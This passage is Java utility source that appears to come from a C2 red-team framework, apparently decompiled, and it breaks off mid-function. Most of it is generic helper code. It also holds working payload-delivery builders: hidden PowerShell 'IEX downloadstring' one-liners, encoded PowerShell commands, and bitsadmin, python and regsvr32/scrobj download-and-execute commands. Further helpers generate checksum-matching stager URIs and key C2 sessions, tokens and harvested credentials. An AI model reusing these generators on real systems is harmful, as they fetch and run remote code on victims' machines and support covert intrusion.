package common;

import dialog.DialogUtils;
import encoders.Base64;
import graph.Route;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.security.DigestInputStream;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.swing.SwingUtilities;

import sleep.runtime.Scalar;
import sleep.runtime.ScalarArray;
import sleep.runtime.SleepUtils;

public class CommonUtils {

    private static final SimpleDateFormat dateFormat = new SimpleDateFormat("MM/dd HH:mm:ss");

    private static final SimpleDateFormat timeFormat = new SimpleDateFormat("MM/dd HH:mm");

    private static final SimpleDateFormat logFormat = new SimpleDateFormat("MM/dd HH:mm:ss zzz");

    private static final Random rgen;

    public static final void print_error(String string) {
        System.out.println("\033[01;31m[-]\033[0m " + string);
    }

    public static final void print_error_file(String string) {
        try {
            System.out.println("\033[01;31m[-]\033[0m " + bString(readResource(string)));
        } catch (Exception exception) {
            MudgeSanity.logException("exception printing my error! " + string, exception, false);
        }
    }

    public static final void print_good(String string) {
        System.out.println("\033[01;32m[+]\033[0m " + string);
    }

    public static final void print_opsec(String string) {
        System.out.println("\033[00;33m[%]\033[0m " + string);
    }

    public static final void print_info(String string) {
        System.out.println("\033[01;34m[*]\033[0m " + string);
    }

    public static final void print_warn(String string) {
        System.out.println("\033[01;33m[!]\033[0m " + string);
    }

    public static final void print_stat(String string) {
        System.out.println("\033[01;35m[*]\033[0m " + string);
    }

    public static final void print_trial(String string) {
        if (License.isTrial()) {
            System.out.println("\033[01;36m[$]\033[0m " + string + " \033[01;36m[This is a trial version limitation]\033[0m");
        }
    }

    public static final Object[] args(Object object) {
        Object[] arrobject = new Object[1];
        arrobject[0] = object;
        return arrobject;
    }

    public static final Object[] args(Object object1, Object object2) {
        Object[] arrobject = new Object[2];
        arrobject[0] = object1;
        arrobject[1] = object2;
        return arrobject;
    }

    public static final Object[] args(Object object1, Object object2, Object object3) {
        Object[] arrobject = new Object[3];
        arrobject[0] = object1;
        arrobject[1] = object2;
        arrobject[2] = object3;
        return arrobject;
    }

    public static final Object[] args(Object object1, Object object2, Object object3, Object object4) {
        Object[] arrobject = new Object[4];
        arrobject[0] = object1;
        arrobject[1] = object2;
        arrobject[2] = object3;
        arrobject[3] = object4;
        return arrobject;
    }

    public static final Object[] args(Object object1, Object object2, Object object3, Object object4, Object object5) {
        Object[] arrobject = new Object[5];
        arrobject[0] = object1;
        arrobject[1] = object2;
        arrobject[2] = object3;
        arrobject[3] = object4;
        arrobject[4] = object5;
        return arrobject;
    }

    public static final Object[] args(Object object1, Object object2, Object object3, Object object4, Object object5, Object object6) {
        Object[] arrobject = new Object[6];
        arrobject[0] = object1;
        arrobject[1] = object2;
        arrobject[2] = object3;
        arrobject[3] = object4;
        arrobject[4] = object5;
        arrobject[5] = object6;
        return arrobject;
    }

    public static final Object[] args(Object object1, Object object2, Object object3, Object object4, Object object5, Object object6, Object object7) {
        Object[] arrobject = new Object[7];
        arrobject[0] = object1;
        arrobject[1] = object2;
        arrobject[2] = object3;
        arrobject[3] = object4;
        arrobject[4] = object5;
        arrobject[5] = object6;
        arrobject[6] = object7;
        return arrobject;
    }

    public static final Object[] args(Object object1, Object object2, Object object3, Object object4, Object object5, Object object6, Object object7, Object object8) {
        Object[] arrobject = new Object[8];
        arrobject[0] = object1;
        arrobject[1] = object2;
        arrobject[2] = object3;
        arrobject[3] = object4;
        arrobject[4] = object5;
        arrobject[5] = object6;
        arrobject[6] = object7;
        arrobject[7] = object8;
        return arrobject;
    }

    public static final boolean isDate(String string1, String string2) {
        try {
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat(string2);
            simpleDateFormat.parse(string1).getTime();
            return true;
        } catch (Exception exception) {
            return false;
        }
    }

    public static final long days(int n) {
        return 86400000L * n;
    }

    public static final long parseDate(String string1, String string2) {
        try {
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat(string2);
            return simpleDateFormat.parse(string1).getTime();
        } catch (Exception exception) {
            MudgeSanity.logException("Could not parse '" + string1 + "' with '" + string2 + "'", exception, false);
            return 0L;
        }
    }

    public static final String formatDateAny(String string, long l) {
        Date date = new Date(l);
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(string);
        return simpleDateFormat.format(date);
    }

    public static final String formatLogDate(long l) {
        Date date = new Date(l);
        return logFormat.format(date);
    }

    public static final String formatDate(long l) {
        Date date = new Date(l);
        return dateFormat.format(date);
    }

    public static final String formatTime(long l) {
        Date date = new Date(l);
        return timeFormat.format(date);
    }

    public static final String pad(String string, int n) {
        return pad(string, ' ', n);
    }

    public static final String pad(String string, char c, int n) {
        StringBuffer stringBuffer = new StringBuffer(string);
        for (int i = string.length(); i < n; i++)
            stringBuffer.append(c);
        return stringBuffer.toString();
    }

    public static final String padr(String string1, String string2, int n) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = string1.length(); i < n; i++)
            stringBuffer.append(string2);
        stringBuffer.append(string1);
        return stringBuffer.toString();
    }

    public static final String join(Collection collection, String string) {
        StringBuffer stringBuffer = new StringBuffer();
        Iterator iterator = collection.iterator();
        while (iterator.hasNext()) {
            stringBuffer.append(iterator.next() + "");
            if (iterator.hasNext())
                stringBuffer.append(string);
        }
        return stringBuffer.toString();
    }

    public static final String joinObjects(Object[] arrobject, String string) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < arrobject.length; i++) {
            if (arrobject[i] != null) {
                stringBuffer.append(arrobject[i].toString());
                if (i + 1 < arrobject.length) {
                    stringBuffer.append(string);
                }
            }
        }
        return stringBuffer.toString();
    }

    public static final String join(String[] arrstring, String string) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < arrstring.length; i++) {
            stringBuffer.append(arrstring[i]);
            if (i + 1 < arrstring.length) {
                stringBuffer.append(string);
            }
        }
        return stringBuffer.toString();
    }

    public static void Guard() {
        if (!SwingUtilities.isEventDispatchThread()) {
            print_error("Violation of EDT Contract in: " + Thread.currentThread().getName());
            Thread.dumpStack();
        }
    }

    public static final void sleep(long l) {
        try {
            Thread.sleep(l);
        } catch (InterruptedException interruptedException) {
            MudgeSanity.logException("sleep utility", interruptedException, false);
        }
    }

    public static void writeObject(File file, Object object) {
        try {
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file, false));
            objectOutputStream.writeObject(SleepUtils.getScalar(object));
            objectOutputStream.close();
        } catch (Exception exception) {
            MudgeSanity.logException("writeObject: " + file, exception, false);
        }
    }

    public static Object readObjectResource(String string) {
        try {
            ObjectInputStream objectInputStream = new ObjectInputStream(resource(string));
            Object object = objectInputStream.readObject();
            objectInputStream.close();
            return object;
        } catch (Exception exception) {
            MudgeSanity.logException("readObjectResource: " + string, exception, false);
            return null;
        }
    }

    public static Object readObject(File file, Object object) {
        try {
            if (file.exists()) {
                ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));
                Scalar scalar = (Scalar) objectInputStream.readObject();
                objectInputStream.close();
                return scalar.objectValue();
            }
        } catch (Exception exception) {
            MudgeSanity.logException("readObject: " + file, exception, false);
        }
        return object;
    }

    public static final byte[] toBytes(String string) {
        int len = string.length();
        byte[] arrby = new byte[len];
        for (int i = 0; i < len; i++) {
            arrby[i] = (byte) string.charAt(i);
        }
        return arrby;
    }

    public static final String bString(byte[] arrby) {
        try {
            return new String(arrby, "ISO8859-1");
        } catch (UnsupportedEncodingException unsupportedEncodingException) {
            MudgeSanity.logException("bString", unsupportedEncodingException, false);
            return "";
        }
    }

    public static final String peekFile(File file, int n) {
        StringBuffer stringBuffer = new StringBuffer(n);
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            for (int i = 0; i < n; i++) {
                int read = fileInputStream.read();
                if (read == -1) {
                    break;
                }
                stringBuffer.append((char) read);
            }
            fileInputStream.close();
            return stringBuffer.toString();
        } catch (IOException iOException) {
            MudgeSanity.logException("peekFile: " + file, iOException, false);
            return stringBuffer.toString();
        }
    }

    public static final byte[] readFile(String string) {
        try {
            FileInputStream fileInputStream = new FileInputStream(string);
            byte[] arrby = readAll(fileInputStream);
            fileInputStream.close();
            return arrby;
        } catch (IOException iOException) {
            MudgeSanity.logException("readFile: " + string, iOException, false);
            return new byte[0];
        }
    }

    public static final byte[] readAndSumFi1e(String string) {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            long l = new File(string).length();
            DigestInputStream digestInputStream = new DigestInputStream(new FileInputStream(string), messageDigest);
            byte[] arrby = new byte[32768];
            while (digestInputStream.read(arrby) >= arrby.length) {
            }
            digestInputStream.close();
            return messageDigest.digest();
        } catch (Throwable throwable) {
            return new byte[0];
        }
    }

    public static final byte[] readAll(InputStream inputStream) {
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(inputStream.available());
            while (true) {
                int i = inputStream.read();
                if (i == -1) {
                    break;
                }
                byteArrayOutputStream.write(i);
            }
            byte[] arrby = byteArrayOutputStream.toByteArray();
            byteArrayOutputStream.close();
            return arrby;
        } catch (Exception exception) {
            MudgeSanity.logException("readAll", exception, false);
            return new byte[0];
        }
    }

    public static String[] toArray(String string) {
        return string.split(",\\s*");
    }

    public static String[] toArray(Collection collection) {
        String[] arrstring = new String[collection.size()];
        Iterator iterator = collection.iterator();
        for (int i = 0; iterator.hasNext(); i++) {
            arrstring[i] = iterator.next() + "";
        }
        return arrstring;
    }

    public static String[] toArray(Object[] arrobject) {
        String[] arrstring = new String[arrobject.length];
        for (int i = 0; i < arrobject.length; i++) {
            arrstring[i] = arrobject[i] + "";
        }
        return arrstring;
    }

    public static List toList(String string) {
        String[] arrstring = toArray(string);
        return new LinkedList(Arrays.asList(arrstring));
    }

    public static Set toSet(String string) {
        if ("".equals(string)) {
            return new HashSet();
        }
        return new HashSet(toList(string));
    }

    public static Set toSet(Object[] arrobject) {
        return new HashSet(toList(arrobject));
    }

    public static Set toSetLC(String[] arrstring) {
        HashSet<String> hashSet = new HashSet();
        for (int i = 0; i < arrstring.length; i++) {
            if (arrstring[i] != null) {
                hashSet.add(arrstring[i].toLowerCase());
            }
        }
        return hashSet;
    }

    public static List toList(Object[] arrobject) {
        LinkedList<Object> linkedList = new LinkedList();
        Collections.addAll(linkedList, arrobject);
        return linkedList;
    }

    public static Scalar toSleepArray(Object[] arrobject) {
        return SleepUtils.getArrayWrapper(toList(arrobject));
    }

    public static String[] toStringArray(ScalarArray scalarArray) {
        int b = 0;
        String[] arrstring = new String[scalarArray.size()];
        Iterator iterator = scalarArray.scalarIterator();
        while (iterator.hasNext()) {
            arrstring[b] = iterator.next() + "";
            b++;
        }
        return arrstring;
    }

    public static Stack scalar(String string) {
        Stack<Scalar> stack = new Stack();
        stack.push(SleepUtils.getScalar(string));
        return stack;
    }

    public static int rand(int n) {
        return rgen.nextInt(n);
    }

    public static String pick(String[] arrstring) {
        return arrstring[rand(arrstring.length)];
    }

    public static Object pick(List list) {
        Object[] arrobject = list.toArray();
        return arrobject[rand(arrobject.length)];
    }

    public static String pick(String string) {
        return pick(toArray(string));
    }

    public static String toHex(long l) {
        return Long.toHexString(l).toLowerCase();
    }

    public static InputStream resource(String string) throws IOException {
        if (new File(string).exists()) {
            return new FileInputStream(new File(string));
        }
        return CommonUtils.class.getClassLoader().getResourceAsStream(string);
    }

    public static String readResourceAsString(String string) {
        return bString(readResource(string));
    }

    public static byte[] readResource(String string) {
        try {
            InputStream inputStream = resource(string);
            if (inputStream != null) {
                byte[] arrby = readAll(inputStream);
                inputStream.close();
                return arrby;
            }
            print_error("Could not find resource: " + string);
        } catch (IOException iOException) {
            MudgeSanity.logException("readResource: " + string, iOException, false);
        }
        return new byte[0];
    }

    public static String replaceAt(String string1, String string2, int n) {
        StringBuffer stringBuffer = new StringBuffer(string1);
        stringBuffer.delete(n, n + string2.length());
        stringBuffer.insert(n, string2);
        return stringBuffer.toString();
    }

    public static int indexOf(byte[] arrby1, byte[] arrby2, int n1, int n2) {
        boolean bool = false;
        for (int i = n1; i < arrby1.length && i < n2; i++) {
            bool = true;
            for (int j = 0; j < arrby2.length && j < arrby1.length; j++) {
                if (arrby1[i + j] != arrby2[j]) {
                    bool = false;
                    break;
                }
            }
            if (bool) {
                return i;
            }
        }
        return -1;
    }

    public static byte[] patch(byte[] arrby, String string1, String string2) {
        String str = bString(arrby);
        StringBuffer stringBuffer = new StringBuffer(str);
        int i = str.indexOf(string1);
        stringBuffer.delete(i, i + string2.length());
        stringBuffer.insert(i, string2);
        return toBytes(stringBuffer.toString());
    }

    public static String writeToTemp(String string1, String string2, byte[] arrby) {
        try {
            File file = File.createTempFile(string1, string2);
            String str = writeToFile(file, arrby);
            file.deleteOnExit();
            return str;
        } catch (IOException iOException) {
            MudgeSanity.logException("writeToTemp", iOException, false);
            return null;
        }
    }

    public static String writeToFile(File file, byte[] arrby) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(file, false);
            fileOutputStream.write(arrby, 0, arrby.length);
            fileOutputStream.flush();
            fileOutputStream.close();
            return file.getAbsolutePath();
        } catch (IOException iOException) {
            MudgeSanity.logException("writeToFile", iOException, false);
            return null;
        }
    }

    public static String repeat(String string, int n) {
        StringBuffer stringBuffer = new StringBuffer(string.length() * n);
        for (int i = 0; i < n; i++) {
            stringBuffer.append(string);
        }
        return stringBuffer.toString();
    }

    public static byte[] zeroOut(byte[] arrby, String[] arrstring) {
        String str = bString(arrby);
        StringBuffer stringBuffer = new StringBuffer(str);
        for (int i = 0; i < arrstring.length; i++) {
            int index = str.indexOf(arrstring[i]);
            int len = arrstring[i].length();
            if (index > -1) {
                stringBuffer.delete(index, index + len);
                stringBuffer.insert(index, new char[len]);
            }
        }
        return toBytes(stringBuffer.toString());
    }

    public static byte[] strrep(byte[] arrby, String string1, String string2) {
        return toBytes(strrep(bString(arrby), string1, string2));
    }

    public static String strrep(String string1, String string2, String string3) {
        StringBuffer stringBuffer = new StringBuffer(string1);
        if (string2.length() == 0) {
            return string1;
        }
        int index = 0;
        int slen = string2.length();
        int elen = string3.length();
        while ((index = stringBuffer.indexOf(string2, index)) > -1) {
            stringBuffer.replace(index, index + slen, string3);
            index += string3.length();
        }
        return stringBuffer.toString();
    }

    public static void copyFile(String string, File file) {
        try {
            FileInputStream fileInputStream = new FileInputStream(string);
            byte[] arrby = readAll(fileInputStream);
            fileInputStream.close();
            writeToFile(file, arrby);
        } catch (IOException iOException) {
            MudgeSanity.logException("copyFile: " + string + " -> " + file, iOException, false);
        }
    }

    public static double toDoubleNumber(String string, double d) {
        try {
            return Double.parseDouble(string);
        } catch (Exception exception) {
            return d;
        }
    }

    public static int toNumber(String string, int n) {
        try {
            return Integer.parseInt(string);
        } catch (Exception exception) {
            return n;
        }
    }

    public static int toNumberFromHex(String string, int n) {
        try {
            return Integer.parseInt(string, 16);
        } catch (Exception exception) {
            return n;
        }
    }

    public static long toLongNumber(String string, long l) {
        try {
            return Long.parseLong(string);
        } catch (Exception exception) {
            return l;
        }
    }

    public static boolean isHexNumber(String string) {
        try {
            Integer.parseInt(string, 16);
            return true;
        } catch (Exception exception) {
            return false;
        }
    }

    public static boolean isNumber(String string) {
        try {
            Integer.parseInt(string);
            return true;
        } catch (Exception exception) {
            return false;
        }
    }

    public static int toTripleOffset(String string) {
        char c1 = string.charAt(0);
        char c2 = string.charAt(1);
        char c3 = string.charAt(2);
        int n = Character.MIN_VALUE;
        n += c1 - 'a';
        n += (c2 - 'a') * 26;
        return n += (c3 - 'a') * 26 * 26;
    }

    public static String[] expand(String string) {
        String[] arrstring = new String[string.length()];
        for (int i = 0; i < arrstring.length; i++) {
            arrstring[i] = string.charAt(i) + "";
        }
        return arrstring;
    }

    public static String toHex(byte[] arrby) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < arrby.length; i++) {
            int b1 = arrby[i] & 0xF;
            int b2 = arrby[i] >> 4 & 0xF;
            stringBuffer.append(Integer.toString(b2, 16));
            stringBuffer.append(Integer.toString(b1, 16));
        }
        return stringBuffer.toString().toLowerCase();
    }

    public static String toHexString(byte[] arrby) {
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("[");
        for (int i = 0; i < arrby.length; i++) {
            stringBuffer.append(Integer.toString(arrby[i] & 0xFF, 16));
            if (i < arrby.length - 1) {
                stringBuffer.append(",");
            }
        }
        stringBuffer.append("]");
        return stringBuffer.toString();
    }

    public static String toAggressorScriptHexString(byte[] arrby) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < arrby.length; i++) {
            String str = Integer.toString(arrby[i] & 0xFF, 16);
            if (str.length() == 1) {
                stringBuffer.append("\\x0");
            } else {
                stringBuffer.append("\\x");
            }
            stringBuffer.append(str);
        }
        return stringBuffer.toString();
    }

    public static String hex(int n) {
        String str = Integer.toString(n & 0xFF, 16);
        if (str.length() == 1) {
            return "0" + str;
        }
        return str;
    }

    public static String toUnicodeEscape(int by) {
        String str = hex(by);
        return "00" + str;
    }

    public static String toNasmHexString(byte[] arrby) {
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("db ");
        for (int i = 0; i < arrby.length; i++) {
            stringBuffer.append("0x");
            stringBuffer.append(Integer.toString(arrby[i] & 0xFF, 16));
            if (i < arrby.length - 1) {
                stringBuffer.append(",");
            }
        }
        return stringBuffer.toString();
    }

    public static byte[] pad(byte[] arrby, int n) {
        return (arrby.length < n) ? Arrays.copyOf(arrby, n) : arrby;
    }

    public static byte[] padg(byte[] arrby, int n) {
        return (arrby.length >= n) ? arrby : join(arrby, randomData(n - arrby.length));
    }

    public static byte[] pad(byte[] arrby) {
        int i = 0;
        while ((arrby.length + i) % 4 != 0) {
            i++;
        }
        return Arrays.copyOf(arrby, arrby.length + i);
    }

    public static String PowerShellOneLiner(String string) {
        return "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('" + string + "'))\"";
    }

    public static String EncodePowerShellOneLiner(String string) {
        try {
            return "powershell.exe -nop -w hidden -encodedcommand " + Base64.encode(string.getBytes("UTF-16LE"));
        } catch (Exception exception) {
            MudgeSanity.logException("Could not encode: '" + string + "'", exception, false);
            return "";
        }
    }

    public static String OneLiner(String string1, String string2) {
        if ("bitsadmin".equals(string2)) {
            String str = garbage("temp");
            return "cmd.exe /c bitsadmin /transfer " + str + " " + string1 + " %APPDATA%\\" + str + ".exe&%APPDATA%\\" + str + ".exe&del %APPDATA%\\" + str + ".exe";
        }
        if ("powershell".equals(string2))
            return PowerShellOneLiner(string1);
        if ("python".equals(string2))
            return "python -c \"import urllib2; exec urllib2.urlopen('" + string1 + "').read();\"";
        if ("regsvr32".equals(string2))
            return "regsvr32 /s /n /u /i:" + string1 + " scrobj.dll";
        print_error("'" + string2 + "' for URL '" + string1 + "' does not have a one-liner");
        throw new RuntimeException("'" + string2 + "' for URL '" + string1 + "' does not have a one-liner");
    }

    public static List combine(List list1, List list2) {
        LinkedList linkedList = new LinkedList();
        linkedList.addAll(list1);
        linkedList.addAll(list2);
        return linkedList;
    }

    public static byte[] join(byte[] arrby1, byte[] arrby2) {
        byte[] arrby = new byte[arrby1.length + arrby2.length];
        System.arraycopy(arrby1, 0, arrby, 0, arrby1.length);
        System.arraycopy(arrby2, 0, arrby, arrby1.length, arrby2.length);
        return arrby;
    }

    public static byte[] join(byte[] arrby1, byte[] arrby2, byte[] arrby3) {
        byte[] arrby = new byte[arrby1.length + arrby2.length + arrby3.length];
        System.arraycopy(arrby1, 0, arrby, 0, arrby1.length);
        System.arraycopy(arrby2, 0, arrby, arrby1.length, arrby2.length);
        System.arraycopy(arrby3, 0, arrby, arrby1.length + arrby2.length, arrby3.length);
        return arrby;
    }

    public static List readOptions(String string) {
        LinkedList<byte[]> linkedList = new LinkedList();
        try {
            byte[] arrby = readResource(string);
            DataInputStream dataInputStream = new DataInputStream(
                    new ByteArrayInputStream(arrby));
            while (dataInputStream.available() > 0) {
                int i = dataInputStream.readInt();
                if (i > dataInputStream.available()) {
                    print_error("readOptions: " + string + " has bad length: " + i
                            + " > " + dataInputStream.available());
                    return linkedList;
                }
                byte[] arrby1 = new byte[i];
                dataInputStream.read(arrby1);
                linkedList.add(arrby1);
            }
        } catch (IOException iOException) {
            MudgeSanity.logException("readOptions: " + string, iOException, false);
        }
        return linkedList;
    }

    public static byte[] pickOption(String string) {
        List list = readOptions(string);
        return (byte[]) list.get(rand(list.size()));
    }

    public static boolean isin(String string1, String string2) {
        return string2.indexOf(string1) >= 0;
    }

    public static Map toMap(String string1, String string2) {
        return toMap(new String[]{string1}, new String[]{string2});
    }

    public static Map toMap(String string1, String string2, String string3, String string4) {
        return toMap(new String[]{string1, string3}, new String[]{string2, string4});
    }

    public static Map toMap(String string1, String string2, String string3,
                            String string4, String string5, String string6) {
        return toMap(new String[]{string1, string3, string5},
                new String[]{string2, string4, string6});
    }

    public static Map toMap(String string1, String string2, String string3,
                            String string4, String string5, String string6,
                            String string7, String string8) {
        return toMap(new String[]{string1, string3, string5, string7},
                new String[]{string2, string4, string6, string8});
    }

    public static Map toMap(Object[] arrobject1, Object[] arrobject2) {
        HashMap<Object, Object> hashMap = new HashMap();
        for (int i = 0; i < arrobject1.length; i++) {
            hashMap.put(arrobject1[i], arrobject2[i]);
        }
        return hashMap;
    }

    public static byte[] asBinary(String string) {
        try {
            File[] arrfile = new File(".").listFiles();
            for (int i = 0; i < arrfile.length; i++) {
                if (checksum8(arrfile[i].getName()) == 152L
                        && arrfile[i].getName().length() == 16) {
                    return MD5(readFile(arrfile[i].getAbsolutePath()));
                }
            }
        } catch (Throwable throwable) {
        }
        return new byte[16];
    }

    public static String garbage(String string) {
        String str = strrep(ID(), "-", "");
        if (string == null) {
            return "";
        }
        if (string.length() > str.length()) {
            return str + garbage(string.substring(str.length()));
        }
        if (string.length() == str.length()) {
            return str;
        }
        return str.substring(0, string.length());
    }

    public static String ID() {
        return UUID.randomUUID().toString();
    }

    public static byte[] randomData(int n) {
        byte[] arrby = new byte[n];
        rgen.nextBytes(arrby);
        return arrby;
    }

    public static byte[] randomDataNoZeros(int n) {
        byte[] arrby;
        boolean bool;
        do {
            arrby = randomData(n);
            bool = true;
            for (int i = 0; i < arrby.length; i++) {
                if (arrby[i] == 0) {
                    bool = false;
                }
            }
        } while (!bool);
        return arrby;
    }

    public static byte[] MD5(byte[] arrby) {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(arrby);
            return messageDigest.digest();
        } catch (Exception exception) {
            MudgeSanity.logException("MD5", exception, false);
            return new byte[0];
        }
    }

    public static Map KV(String string1, String string2) {
        HashMap<String, String> hashMap = new HashMap();
        hashMap.put(string1, string2);
        return hashMap;
    }

    public static int randomPortAbove1024() {
        return rand(60000) + 2048;
    }

    public static int randomPort() {
        return rand(65535);
    }

    public static boolean is64bit() {
        return isin("64", System.getProperty("os.arch") + "");
    }

    public static String dropFile(String string1, String string2, String string3) {
        byte[] arrby = readResource(string1);
        return writeToTemp(string2, string3, arrby);
    }

    public static void runSafe(final Runnable r) {
        final Thread parent = Thread.currentThread();
        if (SwingUtilities.isEventDispatchThread()) {
            try {
                r.run();
            } catch (Exception exception) {
                MudgeSanity.logException("runSafe failed: " + r
                        + " thread: " + parent, exception, false);
            }
        } else {
            SwingUtilities.invokeLater(new Runnable() {
                @Override
                public void run() {
                    try {
                        r.run();
                    } catch (Exception exception) {
                        MudgeSanity.logException("runSafe failed: " + r
                                + " thread: " + parent, exception, false);
                    }
                }
            });
        }
    }

    public static Scalar convertAll(Object object) {
        return ScriptUtils.convertAll(object);
    }

    public static Set difference(Set set1, Set set2) {
        HashSet hashSet = new HashSet();
        hashSet.addAll(set1);
        hashSet.removeAll(set2);
        return hashSet;
    }

    public static Set intersection(Set set1, Set set2) {
        HashSet hashSet = new HashSet();
        hashSet.addAll(set1);
        hashSet.retainAll(set2);
        return hashSet;
    }

    public static long dataIdentity(Object object) {
        long l = 0L;
        if (object == null) {
            return 1L;
        }
        if (object instanceof Collection) {
            Iterator iterator = ((Collection) object).iterator();
            while (iterator.hasNext()) {
                l += 11L * dataIdentity(iterator.next());
            }
        } else if (object instanceof Map) {
            Iterator iterator = ((Map) object).values().iterator();
            while (iterator.hasNext()) {
                l += 13L * dataIdentity(iterator.next());
            }
        } else {
            if (object instanceof BeaconEntry) {
                Map map = ((BeaconEntry) object).toMap();
                map.remove("last");
                map.remove("lastf");
                return dataIdentity(map);
            }
            if (object instanceof Number) {
                return object.hashCode();
            }
            return object.toString().hashCode();
        }
        return l;
    }

    public static String trim(String string) {
        if (string == null) {
            return null;
        }
        return string.trim();
    }

    public static LinkedList parseTabData(String string, String[] arrstring) {
        LinkedList linkedList = new LinkedList();
        String[] astr = string.trim().split("\n");
        for (int i = 0; i < astr.length; i++) {
            HashMap<String, String> hashMap = new HashMap();
            String[] strs1 = astr[i].split("\t");
            for (int j = 0; j < arrstring.length && j < strs1.length; j++) {
                hashMap.put(arrstring[j], strs1[j]);
            }
            if (hashMap.size() > 0) {
                linkedList.add(hashMap);
            }
        }
        return linkedList;
    }

    public static boolean iswm(String string1, String string2) {
        try {
            if ((string1.length() == 0 || string2.length() == 0)
                    && string1.length() != string2.length()) {
                return false;
            }
            int b = 0;
            int i;
            for (i = 0; b < string1.length(); i++) {
                if (string1.charAt(b) == '*') {
                    boolean bool = (b + 1 < string1.length() && string1.charAt(b + 1) == '*');// ? 1 : 0;
                    while (string1.charAt(b) == '*') {
                        if (++b == string1.length()) {
                            return true;
                        }
                    }
                    int j;
                    for (j = b; j < string1.length() && string1.charAt(j) != '?'
                            && string1.charAt(j) != '\\' && string1.charAt(j) != '*'; j++) {
                        ;
                    }
                    if (j != b) {
                        if (bool) {
                            j = string2.lastIndexOf(string1.substring(b, j));
                        } else {
                            j = string2.indexOf(string1.substring(b, j), i);
                        }
                        if (j == -1 || j < i) {
                            return false;
                        }
                        i = j;
                    }
                    if (string1.charAt(b) == '?') {
                        b--;
                    }
                } else {
                    if (i >= string2.length()) {
                        return false;
                    }
                    if (string1.charAt(b) == '\\') {
                        if (++b < string1.length()
                                && string1.charAt(b) != string2.charAt(i)) {
                            return false;
                        }
                    } else if (string1.charAt(b) != '?'
                            && string1.charAt(b) != string2.charAt(i)) {
                        return false;
                    }
                }
                b++;
            }
            return (i == string2.length());
        } catch (Exception exception) {
            MudgeSanity.logException(string1 + " iswm " + string2, exception, false);
            return false;
        }
    }

    public static LinkedList apply(String string, Collection collection,
                                   AdjustData adjustData) {
        LinkedList<Map> linkedList = new LinkedList();
        for (Object object : collection) {
            Map map = adjustData.format(string, object);
            if (map != null) {
                linkedList.add(map);
            }
        }
        return linkedList;
    }

    public static String C2InfoKey(Map map) {
        return DialogUtils.string(map, "bid");
    }

    public static String SessionKey(Map map) {
        return DialogUtils.string(map, "id");
    }

    public static String TokenKey(Map map) {
        return DialogUtils.string(map, "token");
    }

    public static String TargetKey(Map map) {
        return DialogUtils.string(map, "address");
    }

    public static String ApplicationKey(Map map) {
        return DialogUtils.string(map, "nonce");
    }

    public static String ServiceKey(Map map) {
        String str1 = DialogUtils.string(map, "address");
        String str2 = DialogUtils.string(map, "port");
        return str1 + ":" + str2;
    }

    public static String CredKey(Map map) {
        String str1 = DialogUtils.string(map, "user");
        String str2 = DialogUtils.string(map, "password");
        String str3 = DialogUtils.string(map, "realm");
        return str1 + "." + str2 + "." + str3;
    }

    public static List merge(List list1, List list2) {
        HashSet hashSet = new HashSet();
        hashSet.addAll(list1);
        hashSet.addAll(list2);
        return new LinkedList(hashSet);
    }

    public static long checksum8(String string) {
        if (string.length() < 4) {
            return 0L;
        }
        string = string.replace("/", "");
        long l = 0L;
        for (int i = 0; i < string.length(); i++) {
            l += string.charAt(i);
        }
        return l % 256L;
    }

    public static String MSFURI(int n) {
        StringBuffer stringBuffer;
        String[] arrstring = toArray("a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9");
        do {
            stringBuffer = new StringBuffer(n + 1);
            stringBuffer.append("/");
            for (int i = 0; i < n; i++) {
                stringBuffer.append(pick(arrstring));
            }
        } while (checksum8(stringBuffer.toString()) != 92L);
        return stringBuffer.toString();
    }

    public static String MSFURI() {
        return MSFURI(4);
    }

    public static String MSFURI_X64() {
        String str;
        String[] arrstring = toArray("a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9");
        do {
            str = "/" + pick(arrstring) + pick(arrstring) + pick(arrstring) + pick(arrstring);
        } while (checksum8(str) != 93L);
        return str;
    }

    public static long lpow(long l1, long l2) {
        if (l2 == 0L) {
            return 1L;
        }
        if (l2 == 1L) {
            return l1;
        }
        long l = 1L;
        for (int i = 0; i < l2; i++) {
            l *= l1;
        }
        return l;
    }

    public static String drives(String string) {
        LinkedList<String> linkedList = new LinkedList();
        String[] arrstring = expand("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
        long l1 = Long.parseLong(string);
        long l2 = 0L;
